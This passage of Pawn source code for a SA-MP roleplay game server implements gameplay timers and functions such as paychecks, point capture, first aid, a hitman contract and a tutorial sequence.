		fwrite(fPointer, "1");
		fclose(fPointer);
	}
	return 1;
}

forward SeeReportToken(playerid,name[],month,day,year);
public SeeReportToken(playerid,name[],month,day,year)
{
	new string[128], rtoken;
	new strFromFile[128];
	format(string,sizeof(string),"admins/rtokens/%s[%d'%d'%d]",name,month,day,year);
	if(fexist(string))
	{
		new File: file = fopen(string, io_read);
		fread(file, strFromFile);
		fclose(file);

		rtoken = strval(strFromFile);
		format(string,sizeof(string),"Admin has %d report tokens on [%d/%d/%d].",rtoken,month,day,year);
		SendClientMessage(playerid, COLOR_YELLOW, string);
	}
	else
	{
		SendClientMessage(playerid, COLOR_YELLOW, "Admin does not have any logged report tokens for this date.");
		return 0;
	}
	return 1;
}

forward firstaid5(playerid);
public firstaid5(playerid)
{
	if(GetPVarInt(playerid, "usingfirstaid") == 1)
 	{
		new Float:health;
		GetPlayerHealth(playerid, health);
		if(health < 100.0)
		{
		    if((health+5.0) <= 100.0)
		    {
 				SetPlayerHealth(playerid, health+5.0);
			}
		}
	}
}

forward firstaidexpire(playerid);
public firstaidexpire(playerid)
{
	SendClientMessage(playerid, COLOR_GRAD1, "Your first aid kit no longer takes effect.");
 	KillTimer(GetPVarInt(playerid, "firstaid5"));
  	SetPVarInt(playerid, "usingfirstaid", 0);
}

stock GetClosestPlayer(p1)
{
	new Float:dis,Float:dis2,player;
	player = -1;
	dis = 99999.99;
	foreach(Player, x)
	{
			if(x != p1)
			{
				dis2 = GetDistanceBetweenPlayers(x,p1);
				if(dis2 < dis && dis2 != -1.00)
				{
					dis = dis2;
					player = x;
				}
			}
	}
	return player;
}

forward rccam(playerid);
public rccam(playerid)
{
	DestroyVehicle(GetPVarInt(playerid, "rcveh"));
	VehicleRadioStation[GetPVarInt(playerid, "rcveh")] = 0;
 	SetPlayerPos(playerid, GetPVarFloat(playerid, "rcX"), GetPVarFloat(playerid, "rcY"), GetPVarFloat(playerid, "rcZ"));
  	SendClientMessage(playerid, COLOR_GRAD1, "Your RC Cam has ran out of batteries!");
   	SetPVarInt(playerid, "rccam", 0);
}

forward SyncTime();
public SyncTime()
{
	new
		string[64],
		tmphour,
		tmpminute,
		tmpsecond;

	gettime(tmphour, tmpminute, tmpsecond);
	FixHour(tmphour);
	tmphour = shifthour;
	if((tmphour > ghour) || (tmphour == 0 && ghour == 23))
	{
		format(string, sizeof(string), "The time is now %d:00.",tmphour);
		SendClientMessageToAllEx(COLOR_WHITE,string);
		ghour = tmphour;
		TotalUptime += 1;
		PayDay();

		SaveFamilies();
	}
}

PayDay()
{
	new
		string[128];

 	foreach(Player, i) {
		if(PlayerInfo[i][pLevel] > 0) {
			if(PlayerInfo[i][pPayReady] >= 6) {
				new code = Random(100000, 999999);
				PayCheckCode[i] = code;
				SendClientMessage(i, COLOR_GREY,"_______________________________________________________________");
				SendClientMessage(i, COLOR_WHITE,"Information on paychecks: {33CCFF}/payhelp {FFFFFF}or {33CCFF}/taxhelp");
				SendClientMessage(i, COLOR_GREY,"_______________________________________________________________");
				SendClientMessage(i, COLOR_WHITE,"Sign the check to receive your paycheck.");
				SendClientMessage(i, COLOR_LIGHTBLUE, "Type /signcheck");
				SendClientMessage(i, COLOR_WHITE,"You have 5 minutes to sign the check before it becomes invalid.");
				SendClientMessage(i, COLOR_GREY,"_______________________________________________________________");
				GameTextForPlayer(i, "~w~Type /signcheck", 2500, 1);
				if(MP3Station[i] == 0 && BoomBoxSet[i] == 0) {
					PlayerPlaySound(i,SOUND_MUSIC1,2050.1995, 1344.5500, 13.2378);
					PayMusic(i);
				}
				WasHereForPaycheck[i] = 1;
				SetTimer("LastAlertPayCheck", 240000, false);
			} else SendClientMessage(i, COLOR_LIGHTRED, "* You haven't played long enough to obtain a paycheck.");

			if(GetPVarType(i, "debtMsg")) {
				if(PlayerInfo[i][pJailed] < 1 && !IsACop(i) && PlayerInfo[i][pWantedLevel] < 6) {
					format(string,sizeof(string),"You're failing to pay your debt of $%d - now the police are on the look out for you.",GetPlayerCash(i));
					SendClientMessage(i, COLOR_LIGHTRED, string);
					PlayerInfo[i][pCrimes]++;
					SetPlayerWantedLevel(i, ++PlayerInfo[i][pWantedLevel]);
				}
			}
			if(PlayerInfo[i][pRenting] != INVALID_HOUSE_ID) {
				if(HouseInfo[PlayerInfo[i][pRenting]][hRentFee] > PlayerInfo[i][pBank]) {
					PlayerInfo[i][pRenting] = INVALID_HOUSE_ID;
					SendClientMessage(i, COLOR_WHITE, "You have been evicted from your residence for failing to pay rent fees.");
				} else {
					HouseInfo[PlayerInfo[i][pRenting]][hSafeMoney] += HouseInfo[PlayerInfo[i][pRenting]][hRentFee];
					PlayerInfo[i][pBank] -= HouseInfo[PlayerInfo[i][pRenting]][hRentFee];
				}
			}
		}
	}

	for (new x = 0; x < MAX_POINTS; x++) {
		Points[x][Announced] = 0;
		if(Points[x][Vulnerable] > 0) {
			Points[x][Vulnerable]--;
			UpdatePoints();
		}
		if(Points[x][Vulnerable] == 0 && Points[x][Type] >= 0 && Points[x][Announced] == 0 && Points[x][ClaimerId] == INVALID_PLAYER_ID) {
			format(string, sizeof(string), "%s has become available for capture.", Points[x][Name]);
			SendClientMessageToAllEx(COLOR_YELLOW, string);
			ReadyToCapture(x);
			Points[x][Announced] = 1;
		}
	}
	Misc_Save();
	return 1;
}

ReadyToCapture(pointid)
{
	//new string[128];
	foreach(Player, i)
	{
		if(PlayerInfo[i][pGang] < 255)
		{
			if(Points[pointid][Type] == 3 && Points[pointid][Type] == 4) return 1;
			//format(string, sizeof(string), "%s has become available to capture! Stand here and /capture it!", Points[pointid][Name]);
			//Points[pointid][CaptureProccess] = CreateDynamic3DTextLabel(string, COLOR_YELLOW, Points[pointid][Pointx], Points[pointid][Pointy], Points[pointid][Pointz], 10.0, _, _, _, _, _, i);
			Points[pointid][CaptureProccessEx] = 1;
		}
	}
	return 1;
}

forward LastAlertPayCheck();
public LastAlertPayCheck()
{
    foreach(Player, i)
    {
        if(WasHereForPaycheck[i] == 1 && SignedPaycheck[i] == 0)
        {
            if(GetPVarInt(i, "LAPCReceived") != 1)
            {
            	GameTextForPlayer(i, "~w~Type /signcheck", 2500, 1);
            	SendClientMessage(i, COLOR_WHITE, "You have one minute left before your paycheck code expires. Please type /signcheck to get your paycheck.");
            	SetPVarInt(i, "LAPCReceived", 1);
			}
        }
    }
	SetTimer("DestroyChecks", 60000, false);
}

forward DestroyChecks();
public DestroyChecks()
{
    foreach(Player, i)
    {
        PayCheckCode[i] = 0;

        if(WasHereForPaycheck[i] == 1 && SignedPaycheck[i] == 0)
        {
            SendClientMessage(i, COLOR_WHITE, "Your paycheck code expired. Please remember to /signcheck next time.");

			if(AdminDuty[i] == 0)
			{
            	MissedPaychecks[i]++;
			}

            if(MissedPaychecks[i] >= 2 && AdminDuty[i] == 0)
            {
                new string[128];
          		format(string, sizeof(string), "{AA3333}AdmWarning{FFFF00}: %s has been auto kicked for failing to sign two paychecks in a row.", GetPlayerNameEx(i));
				ABroadCast(COLOR_YELLOW, string, 1);
                format(string, sizeof(string), "AdmWarning: %s has been auto kicked for failing to sign two paychecks in a row.", GetPlayerNameEx(i));
                Log("logs/payfarming.log", string);
                Kick(i);
            }
        }

        WasHereForPaycheck[i] = 0;
        SignedPaycheck[i] = 0;
        DeletePVar(i, "LAPCReceived");
    }
}

forward TutorialProgression(playerid);
public TutorialProgression(playerid)
{
    Streamer_Update(playerid);

    if(TutorialProgress[playerid] == 1)
    {
        SetPlayerPos(playerid, 2224.411865, -2649.862060, -30.544359);
        SetPlayerCameraPos(playerid, 2268.519531, -2611.522460, 31.097387);
        SetPlayerCameraLookAt(playerid, 2224.411865, -2649.862060, 13.407735);
        TogglePlayerControllable(playerid,0);

        for(new t = 6; t < 11; t++)
        {
            TextDrawHideForPlayer(playerid, TutTxtDraw[t]);
        }
        for(new t = 11; t < 15; t++)
        {
            TextDrawShowForPlayer(playerid, TutTxtDraw[t]);
        }

        TutorialProgress[playerid] = 13;
		SetTimerEx("TutorialProgression", false, 5000, "i", playerid);
    }
    else if(TutorialProgress[playerid] == 13)
    {
        DeletePVar(playerid, "IsFrozen");
        for(new t = 0; t < 54; t++)
        {
            TextDrawHideForPlayer(playerid, TutTxtDraw[t]);
        }

        SetPlayerInterior(playerid, 0);
        SetPlayerVirtualWorld(playerid, 0);
        SetPlayerPos(playerid, 1777.6880,-1938.7032,13.5565);
        SetPlayerFacingAngle(playerid, 355.3336);
        SetCameraBehindPlayer(playerid);

		InsideTut[playerid] = 0;
		DeletePVar(playerid, "MedicBill");
		SetPlayerColor(playerid,TEAM_HIT_COLOR);
		PlayerInfo[playerid][pTut] = 1;

	    if(PlayerInfo[playerid][pSex] == 1) {
	        PlayerInfo[playerid][pSkin] = 299;
	    } else {
	        PlayerInfo[playerid][pSkin] = 55;
	    }
		SetPlayerSkin(playerid, 299);

		ClearChatbox(playerid);
		new string[128];
		format(string, sizeof(string), "Welcome to Next Generation Roleplay, %s.", GetPlayerNameEx(playerid));
		SendClientMessage(playerid, COLOR_GREY, string);

		format(string, sizeof(string), "~w~Welcome~n~~y~%s", GetPlayerNameEx(playerid));
		GameTextForPlayer(playerid, string, 5000, 1);

		SendClientMessage(playerid, COLOR_YELLOW, "If you have any further questions, please use /newb. You can also /report if you see any rule-breakers.");

		new motdstring[128];
		format(motdstring, sizeof(motdstring), "News: %s", GlobalMOTD);
		SendClientMessage(playerid, COLOR_WHITE, motdstring);

		TutorialProgress[playerid] = 0;
		TogglePlayerControllable(playerid, true);
	}
}

forward SafeLoadObjects(playerid);
public SafeLoadObjects(playerid)
{
	Streamer_Update(playerid);
	if(GetPVarType(playerid, "LoadingObjects"))
	{
		DeletePVar(playerid, "LoadingObjects");
		TogglePlayerControllable(playerid, 1);

		TextDrawHideForPlayer(playerid, ObjectsLoadingTD[0]);
		TextDrawShowForPlayer(playerid, ObjectsLoadingTD[6]);

		SetTimerEx("SafeLoadObjectsClear", 500, 0, "d", playerid);
	}
	if(GetPVarType(playerid, "MedicCall")) {
	    ClearAnimations(playerid, 1);
		ApplyAnimation(playerid, "KNIFE", "KILL_Knife_Ped_Die", 4.0, 0, 1, 1, 1, 0, 1);
	}
}

forward SafeLoadObjectsClear(playerid);
public SafeLoadObjectsClear(playerid)
{
	for(new o = 0; o < 7; o++)
	{
		TextDrawHideForPlayer(playerid, ObjectsLoadingTD[o]);
	}
}

stock ClearMarriage(playerid)
{
	if(IsPlayerConnected(playerid)) {
		new string[MAX_PLAYER_NAME];
		format(string, sizeof(string), "Nobody");
		strmid(PlayerInfo[playerid][pMarriedTo], string, 0, strlen(string), 255);
		PlayerInfo[playerid][pMarried] = 0;
	}
	return 1;
}

forward VehicleBombDelay(playerid);
public VehicleBombDelay(playerid)
{
	new
		string[128],
		name2[MAX_PLAYER_NAME],
		name[MAX_PLAYER_NAME];

	new Float:boomx, Float:boomy, Float:boomz;
	GetPlayerPos(playerid,boomx, boomy, boomz);
	CreateExplosion(boomx, boomy , boomz, 7, 1);
	PlacedVehicleBomb[GetChased[playerid]] = INVALID_VEHICLE_ID;
	new takemoney = PlayerInfo[playerid][pHeadValue] / 4 * 2;
	name = GetPlayerNameEx(playerid);
	GivePlayerCash(GetChased[playerid], takemoney);
	GivePlayerCash(playerid, -takemoney);
	format(string,sizeof(string),"Hitman %s has fulfilled the contract on %s and collected $%d.",GetPlayerNameEx(GetChased[playerid]),GetPlayerNameEx(playerid),PlayerInfo[playerid][pHeadValue] / 4 * 2);
	SendFamilyMessage(4, COLOR_YELLOW, string);
	format(string,sizeof(string),"You have been critically injured by a hitman and lost $%d!",takemoney);
	ResetPlayerWeaponsEx(playerid);
	// SpawnPlayer(playerid);
	SendClientMessage(playerid, COLOR_YELLOW, string);

	foreach(Player, i) {
 		name2 = GetPlayerNameEx(i);
   		if(!strcmp(PlayerInfo[playerid][pContractBy], name2, true)) {
     		if(!IsPlayerStreamedIn(i, playerid)) {
      			format(string, sizeof(string), "SMS: The deed (on %s) has been done, Sender: MOLE (555)", name);
				SendClientMessage(i, COLOR_YELLOW, string);
			}
		}
	}

	PlayerInfo[playerid][pHeadValue] = 0;
	strcpy(PlayerInfo[playerid][pContractBy], "Nobody", 64);
	strcpy(PlayerInfo[playerid][pContractDetail], "None", 64);
	PlayerInfo[GetChased[playerid]][pCHits] += 1;
	SetPlayerHealth(playerid, 0.0);
	// KillEMSQueue(playerid);
	GoChase[GetChased[playerid]] = 999;
	PlayerInfo[GetChased[playerid]][pC4Used] = 0;
	PlayerInfo[GetChased[playerid]][pC4] = 0;
	GotHit[playerid] = 0;
	GetChased[playerid] = 999;
	return 1;
}


/*forward MenuCamFix(playerid);
public MenuCamFix(playerid)
{
    SetCameraBehindPlayer(playerid);
}*/

forward OtherTimerEx(playerid, type);
public OtherTimerEx(playerid, type)
{
	if(type == TYPE_TPMATRUNTIMER)
	{
    	if(GetPVarInt(playerid, "tpMatRunTimer") > 0)
		{
			SetPVarInt(playerid, "tpMatRunTimer", GetPVarInt(playerid, "tpMatRunTimer")-1);
			SetTimerEx("OtherTimerEx", 1000, false, "ii", playerid, TYPE_TPMATRUNTIMER);
		}
	}
	else if(type == TYPE_TPDRUGRUNTIMER)
	{
    	if(GetPVarInt(playerid, "tpDrugRunTimer") > 0)
		{
			SetPVarInt(playerid, "tpDrugRunTimer", GetPVarInt(playerid, "tpDrugRunTimer")-1);
			SetTimerEx("OtherTimerEx", 1000, false, "ii", playerid, TYPE_TPDRUGRUNTIMER);
		}
	}
	else if(type == TYPE_ARMSTIMER)
	{
	    if(GetPVarInt(playerid, "ArmsTimer") > 0)
		{
			SetPVarInt(playerid, "ArmsTimer", GetPVarInt(playerid, "ArmsTimer")-1);
			SetTimerEx("OtherTimerEx", 1000, false, "ii", playerid, TYPE_ARMSTIMER);
		}
	}
	else if(type == TYPE_GUARDTIMER)
	{
	    if(GetPVarInt(playerid, "GuardTimer") > 0)
	    {
	        SetPVarInt(playerid, "GuardTimer", GetPVarInt(playerid, "GuardTimer")-1);
	        SetTimerEx("OtherTimerEx", 1000, false, "ii", playerid, TYPE_GUARDTIMER);
	    }
	}
	else if(type == TYPE_GIVEWEAPONTIMER)
	{
	    if(GetPVarInt(playerid, "GiveWeaponTimer") > 0)
		{
			SetPVarInt(playerid, "GiveWeaponTimer", GetPVarInt(playerid, "GiveWeaponTimer")-1);
			SetTimerEx("OtherTimerEx", 1000, false, "ii", playerid, TYPE_GIVEWEAPONTIMER);
		}
	}
	else if(type == TYPE_SELLMATSTIMER)
	{
	    if(GetPVarInt(playerid, "SellMatsTimer") > 0)
		{
			SetPVarInt(playerid, "SellMatsTimer", GetPVarInt(playerid, "SellMatsTimer")-1);
			SetTimerEx("OtherTimerEx", 1000, false, "ii", playerid, TYPE_SELLMATSTIMER);
		}
	}
	else if(type == TYPE_TPTRUCKRUNTIMER)
	{
    	if(GetPVarInt(playerid, "tpTruckRunTimer") > 0)
		{
			SetPVarInt(playerid, "tpTruckRunTimer", GetPVarInt(playerid, "tpTruckRunTimer")-1);
			SetTimerEx("OtherTimerEx", 1000, false, "ii", playerid, TYPE_TPTRUCKRUNTIMER);
		}
	}
	else if(type == TYPE_HOSPITALTIMER)
	{
	    if(GetPVarInt(playerid, "HospitalTimer") > 0)
		{
		    new Float:curhealth;
			GetPlayerHealth(playerid, curhealth);
			SetPVarInt(playerid, "HospitalTimer", GetPVarInt(playerid, "HospitalTimer")-1);
			SetPlayerHealth(playerid, curhealth+1);
			SetTimerEx("OtherTimerEx", 1000, false, "ii", playerid, TYPE_HOSPITALTIMER);
			if(GetPVarInt(playerid, "HospitalTimer") == 0)
			{
				HospitalSpawn(playerid);
			}
		}
	}
	else if(type == TYPE_FLOODPROTECTION)
	{
 		if(CommandSpamUnmute[playerid] >= 1)
 		{
  			CommandSpamUnmute[playerid]--;
  			SetTimerEx("OtherTimerEx", 1000, false, "ii", playerid, TYPE_FLOODPROTECTION);
    	}
 		if(TextSpamUnmute[playerid] >= 1)
 		{
  			TextSpamUnmute[playerid]--;
  			SetTimerEx("OtherTimerEx", 1000, false, "ii", playerid, TYPE_FLOODPROTECTION);
    	}
	}
	else if(type == TYPE_TPPIZZARUNTIMER)
	{
		if(GetPVarInt(playerid, "tpPizzaTimer") > 0 && GetPVarInt(playerid, "Pizza"))
		{
			SetPVarInt(playerid, "tpPizzaTimer", GetPVarInt(playerid, "tpPizzaTimer")-1);
			SetTimerEx("OtherTimerEx", 1000, false, "ii", playerid, TYPE_TPPIZZARUNTIMER);
		}
	}
	else if(type == TYPE_PIZZATIMER)
	{
	    if(GetPVarInt(playerid, "pizzaTimer") == 0)
		{
            SendClientMessage(playerid, COLOR_WHITE, "You failed to deliver the pizza to the house before it got cold!");
            SetPVarInt(playerid, "Pizza", 0);
            DestroyProgressBar(PizzaBar[playerid]);
            DisablePlayerCheckpoint(playerid);
	    }
	    else if(GetPVarInt(playerid, "Pizza") == 0)
	    {
	        DestroyProgressBar(PizzaBar[playerid]);
            DisablePlayerCheckpoint(playerid);
	    }
	    else if(GetPVarInt(playerid, "pizzaTimer") > 0 && GetPVarInt(playerid, "Pizza") > 0)
	    {
			SetPVarInt(playerid, "pizzaTimer", GetPVarInt(playerid, "pizzaTimer")-1);
	        SetProgressBarValue(PizzaBar[playerid], (GetPVarInt(playerid, "pizzaTimer") * 100.0 / GetPVarInt(playerid, "pizzaTotal")));
	        UpdateProgressBar(PizzaBar[playerid], playerid);
	        SetTimerEx("OtherTimerEx", 1000, false, "ii", playerid, TYPE_PIZZATIMER);
	    }
	}
	else if(type == TYPE_SELLMYTIMER)
	{
    	if(GetPVarInt(playerid, "SellMyTimer") > 0)
		{
			SetPVarInt(playerid, "SellMyTimer", GetPVarInt(playerid, "SellMyTimer")-1);
			SetTimerEx("OtherTimerEx", 1000, false, "ii", playerid, TYPE_SELLMYTIMER);
		}
	}
}

stock VehicleToPoint(Float:radi, vehicleid, Float:x, Float:y, Float:z)
{
	new Float:oldposx, Float:oldposy, Float:oldposz;
	new Float:tempposx, Float:tempposy, Float:tempposz;
	GetVehiclePos(vehicleid, oldposx, oldposy, oldposz);
	tempposx = (oldposx -x);
	tempposy = (oldposy -y);
	tempposz = (oldposz -z);
	if(((tempposx < radi) && (tempposx > -radi)) && ((tempposy < radi) && (tempposy > -radi)) && ((tempposz < radi) && (tempposz > -radi)))
	{
		return 1;
	}
	return 0;
}

encode_tires(tire1, tire2, tire3, tire4)
{
	return tire1 | (tire2 << 1) | (tire3 << 2) | (tire4 << 3);
}

forward AFKick(playerid);
public AFKick(playerid)
{
	if(playerTabbed[playerid] != 0)
	{
 		playerTabbedTime[playerid]++;
 		if(playerTabbedTime[playerid] > 3600 && GetPVarType(playerid, "tabbedVW") == 0) {
			SetPVarInt(playerid, "tabbedVW", GetPlayerVirtualWorld(playerid));
            SetPlayerVirtualWorld(playerid, playerid+1); // so player ID 0 will never be in VW 0, +1.
		}
 		SetTimerEx("AFKick",1000,false,"d",playerid);
	}
	return 1;
}

forward ReportTimer(reportid);
public ReportTimer(reportid)
{
	if(Reports[reportid][BeingUsed] == 1)
	{
	    if(Reports[reportid][TimeToExpire] > 0)
	    {
	        Reports[reportid][TimeToExpire]--;
	        if(Reports[reportid][TimeToExpire] == 0)
	        {
	            SendClientMessage(Reports[reportid][ReportFrom], COLOR_GRAD2, "Your report has expired. You can attempt to report again if you wish.");
	            SendClientMessage(Reports[reportid][ReportFrom], COLOR_GRAD2, "But it's recommended you seek additonal help on the forums (NA)");
	            Reports[reportid][BeingUsed] = 0;
	            Reports[reportid][ReportFrom] = 999;
	            return 1;
	        }
  			Reports[reportid][ReportExpireTimer] = SetTimerEx("ReportTimer", 60000, 0, "d", reportid);
		}
	}
	return 1;
}

forward ReplyTimer(reportid);
public ReplyTimer(reportid)
{
    Reports[reportid][BeingUsed] = 0;
	Reports[reportid][ReportFrom] = 999;
    Reports[reportid][CheckingReport] = 999;
}

forward CaptureTimer(point);
public CaptureTimer(point)
{
	new string[128];
	new fam;
	if(Points[point][ClaimerId] != INVALID_PLAYER_ID && Points[point][TimeToClaim])
	{
		new claimer = Points[point][ClaimerId];
		new Float: x, Float: y, Float: z;
		GetPlayerPos(claimer, x, y, z);
		if(Points[point][Capturex] != x || Points[point][Capturey] != y || Points[point][Capturez] != z || GetPVarInt(Points[point][ClaimerId],"Injured") == 1)
		{
			SendClientMessage(Points[point][ClaimerId], COLOR_LIGHTBLUE, "You failed to capture. You either moved or died while attempting to capture.");
			Points[point][ClaimerId] = INVALID_PLAYER_ID;
			Points[point][TimeToClaim] = 0;
		}
		else
		{
			if(Points[point][Vulnerable] > 0)
			{
			    SendClientMessage(Points[point][ClaimerId], COLOR_LIGHTBLUE, "You failed to capture. The point was already captured.");
				Points[point][ClaimerId] = INVALID_PLAYER_ID;
				Points[point][TimeToClaim] = 0;
				return 1;
			}
			if(playerTabbed[claimer] != 0)
			{
			    SendClientMessage(Points[point][ClaimerId], COLOR_LIGHTBLUE, "You failed to capture. You were alt-tabbed.");
			    format(string, sizeof(string), "{AA3333}AdmWarning{FFFF00}: %s (ID %d) may have possibly alt tabbed to capture a point.", GetPlayerNameEx(claimer), claimer);
				ABroadCast(COLOR_YELLOW, string, 1);

				format(string, sizeof(string), "%s may have possibly alt tabbed to capture a point.", GetPlayerNameEx(claimer));
				AddAutomatedFlag(claimer, string);

   				Points[point][ClaimerId] = INVALID_PLAYER_ID;
				Points[point][TimeToClaim] = 0;
			    return 1;
			}
			fam = PlayerInfo[claimer][pGang];
            Points[point][PlayerNameCapping] = GetPlayerNameEx(claimer);
		   	format(string, sizeof(string), "%s is attempting to take over of the %s for %s, they'll own it in %d minutes.", Points[point][PlayerNameCapping], Points[point][Name], FamilyInfo[fam][FamilyName], TIME_TO_TAKEOVER);
			SendClientMessageToAllEx(COLOR_YELLOW, string);
			if(Points[point][CaptureProccessEx] >= 1)
			{
				Points[point][CaptureProccessEx] = 2;
			}
			Points[point][TakeOverTimerStarted] = 1;
			Points[point][TakeOverTimer] = TIME_TO_TAKEOVER;
			Points[point][ClaimerId] = INVALID_PLAYER_ID;
			Points[point][ClaimerTeam] = fam;
			Points[point][TimeToClaim] = 0;
			if(Points[point][CaptureTimerEx2] != -1) KillTimer(Points[point][CaptureTimerEx2]);
			Points[point][CaptureTimerEx2] = SetTimerEx("CaptureTimerEx", 60000, 1, "d", point);
		}
	}
	return 1;
}

forward ProgressTimer(point);
public ProgressTimer(point)
{
	if(Points[point][ClaimerId] != INVALID_PLAYER_ID && Points[point][TimeToClaim])
	{
	    Points[point][TimeLeft]--;
		SetProgressBarValue(Points[point][PointBarID], GetProgressBarValue(Points[point][PointBarID])-10.0);
		UpdateProgressBar(Points[point][PointBarID], Points[point][ClaimerId]);
		if(Points[point][TimeLeft] >= 1) SetTimerEx("ProgressTimer", 1000, 0, "d", point);
		new string[128];
		format(string, sizeof(string), "%s is attempting to capture the point, time left: %d", GetPlayerNameEx(Points[point][ClaimerId]), Points[point][TimeLeft]);
		if(Points[point][TimeLeft] == 9) Points[point][CaptureProgress] = CreateDynamic3DTextLabel(string, COLOR_RED, Points[point][Pointx], Points[point][Pointy], Points[point][Pointz]+1.0, 10.0);
			else if(Points[point][TimeLeft] < 9 && Points[point][TimeLeft] >= 0) UpdateDynamic3DTextLabelText(Points[point][CaptureProgress], COLOR_RED, string);

		if(Points[point][TimeLeft] == 5)
		{
		    SetProgressBarColor(Points[point][PointBarID], COLOR_YELLOW);
		    UpdateProgressBar(Points[point][PointBarID], Points[point][ClaimerId]);
		}
		else if(Points[point][TimeLeft] == 2)
		{
		    SetProgressBarColor(Points[point][PointBarID], COLOR_RED);
		    UpdateProgressBar(Points[point][PointBarID], Points[point][ClaimerId]);
		}
		else if(Points[point][TimeLeft] <= 0)
		{
		    CaptureTimer(point);
		    Points[point][TimeLeft] = 0;
		    DestroyProgressBar(Points[point][PointBarID]);
		    DestroyDynamic3DTextLabel(Points[point][CaptureProgress]);
		}
	}
	else
	{
	    DestroyProgressBar(Points[point][PointBarID]);
	    DestroyDynamic3DTextLabel(Points[point][CaptureProgress]);
	    Points[point][ClaimerId] = INVALID_PLAYER_ID;
		Points[point][TimeToClaim] = 0;
	}
	return 1;
}

forward CaptureTimerEx(point);
public CaptureTimerEx(point)
{
	new string[128];
	new fam;
	if(Points[point][TakeOverTimerStarted])
	{
		fam = Points[point][ClaimerTeam];
		if(Points[point][TakeOverTimer] > 0)
		{
			Points[point][TakeOverTimer]--;
			//format(string, sizeof(string), "%s has successfully attempted to take over of %s for %s, it will be theirs in %d minutes!",
			//Points[point][PlayerNameCapping], Points[point][Name], FamilyInfo[fam][FamilyName], Points[point][TakeOverTimer]);
			//UpdateDynamic3DTextLabelText(Points[point][CaptureProccess], COLOR_YELLOW, string);
		}
		else
		{
			Points[point][ClaimerTeam] = INVALID_PLAYER_ID;
			Points[point][TakeOverTimer] = 0;
			Points[point][TakeOverTimerStarted] = 0;
			Points[point][Announced] = 0;
			Points[point][Vulnerable] = NEW_VULNERABLE;
			//DestroyDynamic3DTextLabel(Points[point][CaptureProccess]);
			Points[point][CaptureProccessEx] = 0;
			strmid(Points[point][Owner], FamilyInfo[fam][FamilyName], 0, 32, 32);
			strmid(Points[point][CapperName], Points[point][PlayerNameCapping], 0, 32, 32);
			format(string, sizeof(string), "%s has taken control of the %s for %s.", Points[point][CapperName], Points[point][Name], Points[point][Owner]);
			SendClientMessageToAllEx(COLOR_YELLOW, string);
			UpdatePoints();
			KillTimer(Points[point][CaptureTimerEx2]);
			Points[point][CaptureTimerEx2] = -1;
		}
	}
}

stock SurfingCheck(vehicleid)
{
	foreach(Player, p)
	{
		if(GetPlayerSurfingVehicleID(p) == vehicleid)
		{
			new Float:x, Float:y, Float:z;
			GetPlayerPos(p, x, y, z);
		    SetPVarFloat(p, "tempPosX", x);
			SetPVarFloat(p, "tempPosY", x);
			SetPVarFloat(p, "tempPosZ", x);

			SetTimerEx("SurfingFix", 2000, 0, "i", p);
		}
	}
}

forward SurfingFix(playerid);
public SurfingFix(playerid)
{
	SetPlayerPos(playerid, GetPVarFloat(playerid, "tmpPosX"), GetPVarFloat(playerid, "tmpPosY"), GetPVarFloat(playerid, "tmpPosZ"));
	DeletePVar(playerid, "tmpPosX");
	DeletePVar(playerid, "tmpPosY");
	DeletePVar(playerid, "tmpPosZ");

	return 1;
}

forward PutPlayerInVeh(playerid, car);
public PutPlayerInVeh(playerid, car)
{
	PutPlayerInVehicle(playerid, car, 0);
	return 1;
}


forward DrinkCooldown(playerid);
public DrinkCooldown(playerid)
{
    SetPVarInt(playerid, "DrinkCooledDown", 1);
    return 1;
}

forward RadarCooldown(playerid);
public RadarCooldown(playerid)
{
   DeletePVar(playerid, "RadarTimeout");
   return 1;
}

forward HidePlayerAnimTextdraw(playerid);
public HidePlayerAnimTextdraw(playerid)
{
	TextDrawHideForPlayer(playerid,txtAnimHelper);
	return 1;
}

forward ShowPlayerAnimTextdraw(playerid);
public ShowPlayerAnimTextdraw(playerid)
{
	TextDrawShowForPlayer(playerid,txtAnimHelper);
	return 1;
}

Delay:UnfreezeDelay[4000, i](playerid)
{
	TogglePlayerControllable(playerid, 1);
	return 1;
}

// Timer Name: PayMusic(playerid)
Delay:PayMusic[3000, i](playerid)
{
	PlayerPlaySound(playerid,SOUND_OFF,2050.1995, 1344.5500, 13.2378); //Music Off
	return 1;
}

// Timer Name: SkinDelay(playerid)
Delay:SkinDelay[1000, i](playerid)
{
	if(PlayerInfo[playerid][pJailed] == 3 || PlayerInfo[playerid][pJailed] == 4)
	{
	    SetPlayerSkin(playerid, 50);
    	ClearAnimations(playerid, 1);
 		SetPlayerSpecialAction(playerid, SPECIAL_ACTION_NONE);
	    return 1;
	}
	SetPlayerSkin(playerid, PlayerInfo[playerid][pSkin]);
	ClearAnimations(playerid, 1);
 	SetPlayerSpecialAction(playerid, SPECIAL_ACTION_NONE);

 	// SetPVarFloat(extraid, "realX", floatstr(szReturn));

 	if(GetPVarType(playerid, "realX") != 0 && GetPVarType(playerid, "realY") != 0 && GetPVarType(playerid, "realZ") != 0 && GetPVarInt(playerid, "Hospital") == 0 && PlayerInfo[playerid][pHospital] == 0 && PlayerInfo[playerid][pJailTime] == 0) {
		if(GetDistance(GetPVarFloat(playerid, "realX"), GetPVarFloat(playerid, "realY"), GetPVarFloat(playerid, "realZ"), PlayerInfo[playerid][pPos_x], PlayerInfo[playerid][pPos_y], PlayerInfo[playerid][pPos_z]) > 15) {
	 	    SetPlayerPos(playerid, GetPVarFloat(playerid, "realX"), GetPVarFloat(playerid, "realY"), GetPVarFloat(playerid, "realZ"));
	 	    SetPlayerVirtualWorld(playerid, PlayerInfo[playerid][pVW]);
	 	    SetPlayerInterior(playerid, PlayerInfo[playerid][pInt]);

	 	    DeletePVar(playerid, "realX");
	 	    DeletePVar(playerid, "realY");
	 	    DeletePVar(playerid, "realZ");
 	    }
 	}
 	TogglePlayerControllable(playerid, 1);
 	/*
 	if(!IsPlayerInRangeOfPoint(playerid, 30, PlayerInfo[playerid][pPos_x], PlayerInfo[playerid][pPos_y], PlayerInfo[playerid][pPos_z])) {
 	    printf("[debug - coordinate problem] %f, %f, %f", PlayerInfo[playerid][pPos_x], PlayerInfo[playerid][pPos_y], PlayerInfo[playerid][pPos_z]);

 	    // I've noticed some problems with the spawn positions in the MySQL version where players fall from Glen Park, this should prevent this.
 	    SendClientMessage(playerid, COLOR_YELLOW, "[debug] Your coordinates have not been set properly.");
 	    SetPlayerPos(playerid, PlayerInfo[playerid][pPos_x], PlayerInfo[playerid][pPos_y], PlayerInfo[playerid][pPos_z]);
 	    SetPlayerVirtualWorld(playerid, PlayerInfo[playerid][pVW]);
